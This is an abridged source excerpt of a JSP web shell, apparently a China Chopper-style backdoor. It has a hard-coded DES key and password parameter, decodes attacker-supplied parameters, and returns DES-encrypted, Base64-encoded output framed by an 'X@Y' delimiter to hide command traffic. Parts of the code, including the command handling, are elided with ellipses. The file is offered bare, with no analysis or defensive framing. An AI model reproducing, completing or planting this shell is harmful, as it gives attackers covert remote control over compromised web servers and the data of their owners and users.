...
<%@ page language="java" import="java.io.*,java.util.*,java.net.*,java.sql.*,java.text.*,javax.crypto.*,java.security.*,javax.crypto.spec.*"%>
<%!
	String key = "KvCb2poU";//DES加密key
	String cs = "UTF-8";
	String Pwd = "x";
	String postData = "";
	...
	byte[] desEncrypt(String str, String key) throws Exception {
		if (str == null || key == null)
			return null;
		Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding");
		cipher.init(Cipher.ENCRYPT_MODE, new SecretKeySpec(key.getBytes(cs), "DES"));
		byte[] bytes = cipher.doFinal(str.getBytes(cs));
		return bytes;
	}
	
	String desDecrypt(byte[] bytes, String key) throws Exception {
		if (bytes == null || key == null)
			return null;
		Cipher cipher = Cipher.getInstance("DES/ECB/PKCS5Padding");
		cipher.init(Cipher.DECRYPT_MODE, new SecretKeySpec(key.getBytes(cs), "DES"));
		bytes = cipher.doFinal(bytes);
		return new String(bytes, cs);
	}

	String jdkBase64encoder(byte[] secretKey) {
			BASE64Encoder encoder = new BASE64Encoder();
			return encoder.encode(secretKey);
	}
	
	byte[] jdkBase64Decoder(String str) throws IOException {
		BASE64Decoder decoder = new BASE64Decoder();
		return decoder.decodeBuffer(str);
	}
	
	String[] splitParameter(String text){
		String[] parStr = text.split("&");
		return parStr;
	}
	
	String getParameterValue(String text){
...
<%
	...
	if(sp.length <= 2){
		Z = EC(URLDecoder.decode(getParameterValue(sp[0])));
		z0 = getParameterValue(sp[1]);
	}else if(sp.length == 3){
		Z = EC(URLDecoder.decode(getParameterValue(sp[0])));
		z0 = getParameterValue(sp[1]);
		z1 = EC(URLDecoder.decode(getParameterValue(sp[2])));
	}else if(sp.length == 4){
		Z = EC(URLDecoder.decode(getParameterValue(sp[0])));
		z0 = getParameterValue(sp[1]);
		z1 = EC(URLDecoder.decode(getParameterValue(sp[2])));
		z2 = EC(URLDecoder.decode(getParameterValue(sp[3])));
	}
	cs = z0 != null ? z0 + "" : cs;
	...
	sb.append("X@Y");
	String test = jdkBase64encoder(desEncrypt(sb.toString(), key)).replace("\n", "").replace("\r", "");
	out.print(test);
%>